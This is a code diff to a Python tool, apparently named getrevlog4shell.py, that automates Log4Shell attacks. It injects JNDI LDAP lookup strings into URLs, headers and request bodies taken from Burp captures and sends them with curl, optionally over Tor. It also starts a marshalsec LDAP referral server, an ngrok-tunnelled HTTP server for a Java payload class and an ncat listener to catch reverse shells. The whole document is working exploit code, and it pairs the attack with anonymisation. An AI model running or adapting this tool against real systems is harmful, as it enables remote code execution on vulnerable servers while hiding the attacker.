@@ -82,9 +82,12 @@ class HTTP:
 
     def __del__(self):
         if hasattr(self, "proc"):
-            self.proc.terminate()
-            self.proc.kill()
-            self.proc.send_signal(subprocess.signal.SIGKILL)
+            try:
+                self.proc.terminate()
+                self.proc.kill()
+                self.proc.send_signal(subprocess.signal.SIGKILL)
+            except:
+                pass
     
     def run(self):
         self.proc = subprocess.run('exo-open --launch TerminalEmulator python3 -m http.server ' + port_http_server + ' --directory ' + abs_path + path_http_server + ' &', shell=True)
@@ -209,33 +212,42 @@ def ncat():
     return
 
 def readfile(burp_file):
-    global vuln_server, method, headers, data
+    global vuln_server, method, headers, data, protocol
     os.chdir(abs_path)
     headers_end = False
     headers = []
     data = []
-    f = open(burp_file, "r")
-    lines = f.readlines()
-    
-    for line in lines:
-        if lines.index(line) == 0:
-            line = line.strip("\n")
-            method = line.split(" ")[0]
-            sufix_host = line.split(" ")[1]
-            protocol = (line.split(" ")[2].split("/")[0]).lower()
-        elif "Host" in line:
-            prefix_host = line.strip("\n").split(": ")[1]
-        elif line == '\n':
-            headers_end = True
-        elif line != '' and line != '\n' and not headers_end:
-            headers.append(line.strip("\n"))
-        elif line != '' and line != '\n' and headers_end:
-            data.append(line.strip("\n"))
-    
-    vuln_server = protocol + '://' + prefix_host + sufix_host
-    f.close()
-    commands = prepare_list_commands()
-    return commands
+    try:
+        f = open(burp_file, "r")
+        lines = f.readlines()
+        
+        for line in lines:
+            if lines.index(line) == 0:
+                line = line.strip("\n")
+                method = line.split(" ")[0]
+                sufix_host = line.split(" ")[1]
+                type = line.split(" ")[2].split('/')[1]
+                protocol = (line.split(" ")[2].split("/")[0]).lower()
+                if protocol == 'http' and type == '2':
+                    protocol = 'https'
+                elif protocol == 'http' and type == '1':
+                    pass
+            elif "Host" in line:
+                prefix_host = line.strip("\n").split(": ")[1]
+            elif line == '\n':
+                headers_end = True
+            elif line != '' and line != '\n' and not headers_end:
+                headers.append(line.strip("\n"))
+            elif line != '' and line != '\n' and headers_end:
+                data.append(line.strip("\n"))
+        
+        vuln_server = protocol + '://' + prefix_host + sufix_host
+        f.close()
+        commands = prepare_list_commands()
+        return commands
+    except:
+        print("Error at loading file")
+        end()
 
 def check(list):
     for l in list:
@@ -246,41 +258,55 @@ def check(list):
 def prepare_list_commands():
     global use_tor, port_tor_tunnel, method, vuln_server, headers, data, host_tcp, port_ldap_server
     
+    def create_header(h):
+        str_head = ' '
+        for i in h:
+            str_h = '-H "' + i + '" '
+            str_head = str_head + str_h
+        return str_head
+
     string_tor = ' '
-    str_header = ' '
-    str_d = data[0]
-    for i in headers:
-        str_h = '-H "' + i + '" '
-        str_header = str_header + str_h
+    str_header = create_header(headers)
+    if len(data):
+        str_d = '-d ' + data[0]
+    else:
+        str_d = ""
     if use_tor:
         string_tor = ' --proxy socks5://127.0.0.1:' + port_tor_tunnel + ' '
     terminate = False
     count = 0
     commands = []
-    while not terminate:
+    while True:
         count += 1
         varcode = "{:05d}".format(count)
-        str_injection = '${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}'
+        str_injection_1 = '\${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}'
+        str_injection_2 = '${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}'
         if "*" in vuln_server:
-            vuln_server = vuln_server.replace("*", str_injection)
-            commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server, varcode))
-        elif len(headers) > 0 and check(headers):
+            vuln_server = vuln_server.replace("*", str_injection_1)
+            commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server + ' -s -k -L', varcode))
+        elif len(headers) > 0 and check(headers) and not terminate:
             for i in headers:
-                if "*" in i:
-                    i = i.replace("*", str_injection)
-                    commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server, varcode))
-                    i = i.replace(str_injection, "*")
-                    break
+                if "*" in i and not "*/*" in i:
+                    index = headers.index(i)
+                    i = i.replace("*", str_injection_1)
+                    headers[index] = i
+                    str_header = create_header(headers)
+                    commands.append(('curl' + string_tor + '-X ' + method + str_header + str_d + ' ' + vuln_server + ' -s -k -L', varcode))
+                    i = i.replace(str_injection_1, "*")
+                    headers[index] = i
+            str_header = create_header(headers)
+            terminate = True
         elif len(data) > 0 and "*" in data[0]:
             count = data[0].count("*")
             for i in range(count):
-                str_data = '-d \'' + str_d.replace("*", str_injection, i + 1) + '\''
+                str_data = '\'' + str_d.replace("*", str_injection_2, i + 1) + '\''
                 if count <= (i + 1):
-                    str_data = str_data.replace(str_injection, "*", count - i)
-                commands.append(('curl' + string_tor + '-X ' + method + str_header + str_data + ' ' + vuln_server, varcode))
+                    str_data = str_data.replace(str_injection_2, "*", count - i)
+                commands.append(('curl' + string_tor + '-X ' + method + str_header + str_data + ' ' + vuln_server + ' -s -k -L', varcode))
             break
         else:
-            terminate = True
+            #terminate = True
+            break
     
     return commands
 
@@ -329,7 +355,7 @@ def create_class_java():
     compile_java(name_file + ".java")
 
 def to_process():
-    global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path, host_http_ngrok, port_nc_ngrok
+    global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path, host_http_ngrok, port_nc_ngrok, protocol
 
     with concurrent.futures.ThreadPoolExecutor() as executor:
         time.sleep(1)
@@ -345,7 +371,7 @@ def to_process():
             p2 = executor.submit(ngrok_get,)
             result = p2.result()
             for a in result['tunnels']:
-                if a['proto'] == 'http':
+                if a['proto'] == protocol:
                     host_http_ngrok = a['public_url'].split('//')[1]
                 elif a['proto'] == 'tcp':
                     pt = a['config']['addr'].split(':')[1]
@@ -376,7 +402,7 @@ def to_process():
 
             p7 = executor.submit(ncat,)
 
-        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http_ngrok + port + '/#' + name_file +'"'
+        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "' + protocol + '://' + host_http_ngrok + port + '/#' + name_file +'"'
         print(command_server_ldap)
         ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_server)
         if (os.path.isfile(abs_path + path_ldap_server + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
@@ -400,7 +426,6 @@ def to_process():
         # else:
         #     print("LDAP server loading error. Restart aplication.")
         #     end()
-
         p6 = executor.submit(execute, commands, ldap_server)
 
 def initialize():
@@ -419,12 +444,9 @@ def initialize():
                 exit(0)
             else:
                 ngrok_create(auth_token, port_http_server, port_ldap_server )
-        else:
-            if not auth_token:
-                print("You must to use auth token for ngrok")
+        elif not ngrok_verify_file() or not ngrok_verify_file_tor():
+                print("You must to use auth token for ngrok and recreate option")
                 exit(0)
-            elif not ngrok_verify_file() or not ngrok_verify_file_tor():
-                ngrok_create(auth_token, port_http_server, port_ldap_server )
 
     to_process()
 
@@ -440,7 +462,7 @@ if __name__ == "__main__":
     path_http_server = "/HTTP_Service"
     abs_path = os.getcwd()
     parser = argparse.ArgumentParser(
-        description='Usage getrevlog4shell.py -v "http://vulnerable.host" [options]',
+        description='Usage getrevlog4shell.py -v "proto://vulnerable.host" [options]',
         epilog='You must use ngrok and tor options to maintain privacy.'
         )
     parser.add_argument("-v", "--vns", type=str, help="Host vulnerable")
@@ -464,6 +486,7 @@ if __name__ == "__main__":
     port_nc_server = '4444'
     port_nc_ngrok = port_nc_server
     port_tor_tunnel = '9050'
+    protocol = "http"
     use_ngrok = False
     recreate = False
     auth_token = None
@@ -472,7 +495,7 @@ if __name__ == "__main__":
     method = "POST"
     data = []
     headers = []
-    file = None
+    burp_file = None
 
     if args.port_ldap_server: port_ldap_server = str(args.port_ldap_server).replace(" ", "")
     if args.port_http_server: port_http_server = str(args.port_http_server).replace(" ", "")
@@ -506,12 +529,7 @@ if __name__ == "__main__":
                 print('Set location testing with param <*>.')
                 exit(0)
     
-    initialize()
-    
-        
-
-        
-        
-
-        
-
+    try:
+        initialize()
+    except KeyboardInterrupt:
+        end()
